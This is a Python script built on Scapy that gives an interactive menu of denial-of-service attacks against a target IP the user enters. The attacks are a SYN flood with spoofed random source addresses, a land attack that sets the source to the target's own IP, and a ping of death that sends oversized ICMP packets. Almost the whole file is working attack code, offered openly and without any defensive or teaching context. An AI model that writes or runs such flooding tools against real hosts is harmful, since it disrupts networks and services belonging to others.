from scapy.all import *
from scapy import *
from telnetlib import IP

from scapy.layers.dns import DNS
from scapy.layers.inet import *
import os, sys, random

def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

def randInt():
    random_time = random.randint(1000, 9000)
    return random_time

def syn_flooding(dip, d_port, counter):
    total = 0
    for i in range(0, counter):
        ip = IP()
        ip.src = randomIP()
        #ip.src = "192.168.1.10"
        ip.dst = dip

        tcp = TCP()
        tcp.sport = randInt()
        tcp.dport = d_port
        tcp.flags = "S"
        tcp.seq = randInt()
        tcp.window = randInt()
        send(ip/tcp, verbose=0)
        total = total + 1
    print("Total packet sent : %i" % total)

def landattack(ip, counter=10000):
    ip = str(ip)
    for i in range(1, counter):
        attack = IP(src=ip, dst=ip, proto="icmp")/ICMP()/("a"*60000)
        send(attack)
    print("done")

def pingofdeath(dip, counter=10000):
    for i in range(counter):
        ping = IP(src="192.168.1.10", dst=dip, proto="icmp")/ICMP()/("Hi"*30000)
        send(ping)

def print_doslist():
    dos_select = ""
    while dos_select != "exit":
        print("DoS Attack List")
        print("1. SYN Flooding")
        print("2. Land Attack")
        print("3. Ping of Death")

        dos_select = input("Select menu : ")

        if dos_select == "1":
            print("Select SYN Flooding")
            dip = input("Input target IP : ")
            dport = int(input("Input target PORT : "))
            counter = int(input("Input Attack count : "))
            syn_flooding(dip, dport, counter)

        elif dos_select == "2":
            print("Select Land Attack")
            ip = input("Input target IP : ")
            counter = int(input("Input Attack count : "))
            landattack(ip, counter)

        elif dos_select == "3":
            print("Select Ping Of Death")
            ip = input("Input target IP : ")
            pingofdeath(ip)
